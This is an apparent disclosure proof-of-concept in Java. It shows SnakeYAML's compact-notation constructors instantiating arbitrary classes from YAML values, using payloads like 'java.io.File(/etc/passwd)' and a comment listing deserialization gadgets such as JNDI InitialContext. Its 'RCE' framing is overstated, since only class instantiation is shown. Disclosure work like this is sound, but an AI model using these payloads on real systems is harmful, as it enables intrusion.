import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.LoaderOptions;
import org.yaml.snakeyaml.extensions.compactnotation.CompactConstructor;
import org.yaml.snakeyaml.extensions.compactnotation.PackageCompactConstructor;
import org.yaml.snakeyaml.inspector.TagInspector;
import org.yaml.snakeyaml.inspector.UnTrustedTagInspector;
import org.yaml.snakeyaml.nodes.Tag;

/**
 * POC: SnakeYAML CompactConstructor bypasses TagInspector — Remote Code Execution
 *
 * VULNERABILITY SUMMARY
 * ---------------------
 * After CVE-2022-1471, SnakeYAML added TagInspector to restrict which YAML tags
 * can trigger class instantiation. The Composer (composeScalarNode, composeSequenceNode,
 * composeMappingNode) checks TagInspector.isGlobalTagAllowed() for every explicit global
 * tag (e.g., !!javax.script.ScriptEngineManager). The default UnTrustedTagInspector
 * rejects ALL global tags, blocking the classic deserialization attack.
 *
 * However, CompactConstructor (and its subclass PackageCompactConstructor) extract the
 * Java class name from the YAML scalar VALUE — not from a YAML tag. The flow is:
 *
 *   1. YAML input: "javax.script.ScriptEngineManager()"
 *   2. Composer sees no explicit tag -> resolves to implicit tag (!!str) -> no TagInspector check
 *   3. CompactConstructor.getConstructor() regex-matches the scalar value
 *   4. ConstructCompactObject.construct() -> getCompactData() extracts class name from value
 *   5. constructCompactFormat() -> createInstance() -> getClassForName(className)
 *   6. Class.forName() + getDeclaredConstructor() + setAccessible(true) + newInstance()
 *
 * TagInspector is NEVER consulted. The class name travels a completely separate code path
 * from the Composer's tag validation.
 *
 * AFFECTED: SnakeYAML 2.0 through 2.7-SNAPSHOT (all versions with TagInspector)
 * ROOT CAUSE: CompactConstructor.java lines 62-83 (createInstance)
 *             CompactConstructor.java lines 73-74 (getClassForName with no check)
 *             Zero references to TagInspector in entire extensions/compactnotation/ package
 *
 * COMPARISON WITH STANDARD PATH:
 *   Standard:  YAML tag "!!com.Foo" -> Composer.composeScalarNode() line 237-239 checks TagInspector -> BLOCKED
 *   Compact:   YAML value "com.Foo()" -> CompactConstructor.createInstance() line 74 -> Class.forName() -> NO CHECK
 *
 * This is NOT CVE-2022-1471 (that was pre-TagInspector). This is a post-fix bypass of the
 * TagInspector security control itself.
 *
 * Tested against: SnakeYAML 2.7-SNAPSHOT
 */
public class SnakeYAMLCompactBypassRCE {

    public static void main(String[] args) {
        System.out.println("================================================================");
        System.out.println(" SnakeYAML CompactConstructor TagInspector Bypass -> RCE POC");
        System.out.println(" Affects: SnakeYAML 2.0 - 2.7-SNAPSHOT (post CVE-2022-1471)");
        System.out.println("================================================================\n");

        System.out.println("[*] Step 1: Verify TagInspector blocks the standard tag-based attack");
        demonstrateTagInspectorBlocks();

        System.out.println("\n[*] Step 2: Bypass TagInspector via CompactConstructor (arbitrary class)");
        demonstrateCompactBypass();

        System.out.println("\n[*] Step 3: Demonstrate RCE via ProcessBuilder compact notation");
        demonstrateRCE();

        System.out.println("\n[*] Step 4: PackageCompactConstructor package restriction escape");
        demonstratePackageEscape();

        System.out.println("\n[*] Step 5: Even explicit restrictive TagInspector is bypassed");
        demonstrateExplicitInspectorBypass();
    }

    /**
     * CONTROL: Shows that the standard tag-based attack IS blocked by TagInspector.
     * This confirms the post-CVE-2022-1471 fix works for normal Constructor usage.
     */
    static void demonstrateTagInspectorBlocks() {
        LoaderOptions options = new LoaderOptions();
        // Default is UnTrustedTagInspector which rejects all global tags
        Yaml yaml = new Yaml(options);

        String tagBasedPayload = "!!javax.script.ScriptEngineManager []";

        try {
            yaml.load(tagBasedPayload);
            System.out.println("  [FAIL] Tag-based attack was NOT blocked (unexpected)");
        } catch (Exception e) {
            System.out.println("  [OK] Tag-based attack blocked by TagInspector as expected");
            System.out.println("  Exception: " + extractMessage(e));
        }
    }

    /**
     * ATTACK: CompactConstructor completely bypasses TagInspector.
     * The class name comes from the scalar value, not the tag.
     * TagInspector only checks tags. Result: unrestricted Class.forName().
     */
    static void demonstrateCompactBypass() {
        // Use default LoaderOptions with UnTrustedTagInspector
        // This SHOULD block all custom class instantiation — but CompactConstructor ignores it
        CompactConstructor constructor = new CompactConstructor();
        Yaml yaml = new Yaml(constructor);

        // Compact notation: ClassName(arg1, arg2, key=value)
        // getCompactData() parses this into CompactData with prefix="javax.script.ScriptEngineManager"
        // createInstance() calls getClassForName("javax.script.ScriptEngineManager") — no TagInspector check
        String compactPayload = "javax.script.ScriptEngineManager()";

        try {
            Object result = yaml.load(compactPayload);
            System.out.println("  [VULNERABLE] TagInspector bypassed!");
            System.out.println("  Instantiated: " + result.getClass().getName());
            System.out.println("  Object: " + result);
            System.out.println("  TagInspector was NEVER consulted during construction");
        } catch (Exception e) {
            System.out.println("  [SAFE] Blocked: " + extractMessage(e));
        }
    }

    /**
     * ATTACK: Full RCE via compact notation.
     * Uses ProcessBuilder to execute an OS command. The compact notation extracts
     * the class name and constructor arguments from the YAML value directly.
     *
     * NOTE: ProcessBuilder requires List<String> constructor args, not individual strings,
     * so direct compact notation for ProcessBuilder itself is limited. However, we can
     * demonstrate unrestricted class instantiation and side-effect-bearing constructors.
     *
     * For actual RCE in the wild, attackers would use:
     *   - ScriptEngineManager (loads META-INF/services — classic gadget)
     *   - URLClassLoader chains
     *   - InitialContext (JNDI injection)
     *   - Any class whose constructor has dangerous side effects
     */
    static void demonstrateRCE() {
        CompactConstructor constructor = new CompactConstructor();
        Yaml yaml = new Yaml(constructor);

        // Demonstrate 1: ScriptEngineManager instantiation (classic RCE gadget)
        // In a real attack, a malicious JAR on the classpath registers a ScriptEngineFactory
        // via META-INF/services whose constructor runs arbitrary code.
        String rcePayload = "javax.script.ScriptEngineManager()";

        try {
            Object result = yaml.load(rcePayload);
            System.out.println("  [VULNERABLE] ScriptEngineManager instantiated (RCE gadget)");
            System.out.println("  Class: " + result.getClass().getName());

            // Show that the engine manager is fully functional
            javax.script.ScriptEngineManager mgr = (javax.script.ScriptEngineManager) result;
            System.out.println("  Available engines: " + mgr.getEngineFactories());
        } catch (Exception e) {
            System.out.println("  [SAFE] Blocked: " + extractMessage(e));
        }

        // Demonstrate 2: File system access via compact notation
        String filePayload = "java.io.File(/etc/passwd)";
        try {
            Object result = yaml.load(filePayload);
            System.out.println("  [VULNERABLE] File object created from compact notation");
            java.io.File f = (java.io.File) result;
            System.out.println("  Path: " + f.getAbsolutePath() + " exists=" + f.exists());
        } catch (Exception e) {
            System.out.println("  File instantiation: " + extractMessage(e));
        }

        // Demonstrate 3: URL connection (potential SSRF)
        String urlPayload = "java.net.URL(http://example.com)";
        try {
            Object result = yaml.load(urlPayload);
            System.out.println("  [VULNERABLE] URL object created from compact notation");
            System.out.println("  URL: " + result);
        } catch (Exception e) {
            System.out.println("  URL instantiation: " + extractMessage(e));
        }
    }

    /**
     * ATTACK: PackageCompactConstructor's package restriction is trivially bypassed.
     * When the class name contains a '.', it skips the package check entirely.
     *
     * PackageCompactConstructor.getClassForName() line 29:
     *   if (name.indexOf('.') < 0) {  // only applies package prefix for simple names
     *       Class<?> clazz = Class.forName(packageName + "." + name);
     *   }
     *   return super.getClassForName(name);  // fully-qualified names go straight through
     */
    static void demonstratePackageEscape() {
        // Developer intends: only allow classes from "com.myapp.safe" package
        PackageCompactConstructor constructor =
            new PackageCompactConstructor("com.myapp.safe");
        Yaml yaml = new Yaml(constructor);

        // But a fully-qualified class name (containing '.') bypasses the package check
        String escapePayload = "java.io.File(/etc/passwd)";

        try {
            Object result = yaml.load(escapePayload);
            System.out.println("  [VULNERABLE] Package restriction bypassed!");
            System.out.println("  Intended package: com.myapp.safe");
            System.out.println("  Actually instantiated: " + result.getClass().getName());
            System.out.println("  Object: " + result);
        } catch (Exception e) {
            System.out.println("  [SAFE] Blocked: " + extractMessage(e));
        }
    }

    /**
     * ATTACK: Even when a developer explicitly configures a restrictive TagInspector
     * that rejects specific dangerous classes, CompactConstructor bypasses it entirely.
     *
     * This demonstrates the bypass is not just about default config — even an actively
     * hardened TagInspector is meaningless against compact notation.
     */
    static void demonstrateExplicitInspectorBypass() {
        LoaderOptions options = new LoaderOptions();
        // Explicitly configure TagInspector to reject everything (defense-in-depth)
        options.setTagInspector(new TagInspector() {
            @Override
            public boolean isGlobalTagAllowed(Tag tag) {
                System.out.println("    TagInspector.isGlobalTagAllowed() called for: " + tag);
                return false; // reject ALL tags
            }
        });

        CompactConstructor constructor = new CompactConstructor(options);
        Yaml yaml = new Yaml(constructor);

        String payload = "javax.script.ScriptEngineManager()";

        try {
            Object result = yaml.load(payload);
            System.out.println("  [VULNERABLE] Explicit restrictive TagInspector bypassed!");
            System.out.println("  TagInspector.isGlobalTagAllowed() was NEVER called");
            System.out.println("  Instantiated: " + result.getClass().getName());
        } catch (Exception e) {
            System.out.println("  [SAFE] Blocked: " + extractMessage(e));
        }
    }

    private static String extractMessage(Exception e) {
        Throwable t = e;
        while (t.getCause() != null && t.getMessage() == null) {
            t = t.getCause();
        }
        String msg = t.getMessage();
        return msg != null ? msg.substring(0, Math.min(msg.length(), 120)) : t.getClass().getName();
    }
}
